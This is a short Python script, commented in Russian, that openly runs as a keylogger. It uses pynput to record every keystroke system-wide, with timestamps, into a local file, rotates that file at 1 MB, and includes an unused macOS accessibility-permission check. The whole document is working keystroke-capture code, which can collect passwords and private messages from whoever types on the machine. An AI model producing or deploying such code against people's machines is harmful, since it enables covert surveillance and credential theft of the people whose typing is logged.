import os
import sys
import time
from pynput import keyboard

LOG_FILE = "keylog.txt"
MAX_LOG_SIZE = 1 * 1024 * 1024  # 1 МБ

def rotate_log():
    """
    Проверяет размер файла лога.
    Если размер превышает MAX_LOG_SIZE, переименовывает файл с меткой 
времени и создаёт новый.
    """
    if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) > MAX_LOG_SIZE:
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        new_name = f"keylog_{timestamp}.txt"
        os.rename(LOG_FILE, new_name)
        print(f"[INFO] Log rotated: {new_name}")

# Проверка прав доступа к Accessibility (только для macOS)
def is_accessibility_enabled_mac():
    try:
        import subprocess
        script = '''
        tell application "System Events"
            return UI elements enabled
        end tell
        '''
        result = subprocess.run(['osascript', '-e', script], 
capture_output=True, text=True)
        return result.stdout.strip().lower() == 'true'
    except Exception as e:
        print(f"[!] Could not verify accessibility access: {e}")
        return False

def on_press(key):
    print(f"[DEBUG] Pressed: {key}")
    rotate_log()  # Проверяем ротацию перед записью

    try:
        with open(LOG_FILE, "a") as log:
            log.write(f"{time.strftime('%a %b %d %H:%M:%S %Y')} - {key.char}\n")
    except AttributeError:
        with open(LOG_FILE, "a") as log:
            log.write(f"{time.strftime('%a %b %d %H:%M:%S %Y')} - {key}\n")

print("Keylogger started. Logging to keylog.txt...")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

